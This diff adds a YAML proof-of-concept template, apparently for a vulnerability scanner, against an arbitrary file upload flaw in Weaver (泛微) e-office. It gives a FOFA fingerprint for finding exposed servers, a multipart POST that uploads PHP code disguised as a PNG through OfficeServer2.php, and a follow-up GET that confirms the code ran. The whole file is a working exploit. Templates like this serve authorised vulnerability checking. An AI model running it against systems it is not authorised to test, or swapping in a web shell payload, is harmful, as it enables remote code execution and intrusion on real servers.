@@ -1,0 +1,53 @@
+id: poc-yaml-weaver-e-office-saveversion-anyfile-upload
+info:
+  name: 泛微OA e-office SAVEVERSION 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: e-office
+  fofa: body="/general/login/view//images/updateLoad.gif"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /iWebOffice/OfficeServer2.php
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySIELKZKzD7vQmdsO
+  data: '------WebKitFormBoundarySIELKZKzD7vQmdsO
+
+    Content-Disposition: form-data; name="RECORDID"
+
+
+    test
+
+    ------WebKitFormBoundarySIELKZKzD7vQmdsO
+
+    Content-Disposition: form-data; name="OPTION"
+
+
+    SAVEVERSION
+
+    ------WebKitFormBoundarySIELKZKzD7vQmdsO
+
+    Content-Disposition: form-data; name="FILETYPE"
+
+
+    .php
+
+    ------WebKitFormBoundarySIELKZKzD7vQmdsO
+
+    Content-Disposition: form-data; name="MsgFileBody"; filename="test.png"
+
+
+    <?=md5({{.t1}});unlink(__FILE__);
+
+    ------WebKitFormBoundarySIELKZKzD7vQmdsO--'
+  expression: status_code == 200 && contains(body,"VERSION") && contains(body,"FULPATH=")
+  output:
+  - regex_match(body,"FULPATH=(?P<file>.*?)\\n")
+  - set_var("decodefile",substr(base64_decode(file),30,35))
+- method: GET
+  path: /attachment/{{.decodefile}}
+  expression: status_code == 200 && body == t2
+transport: http
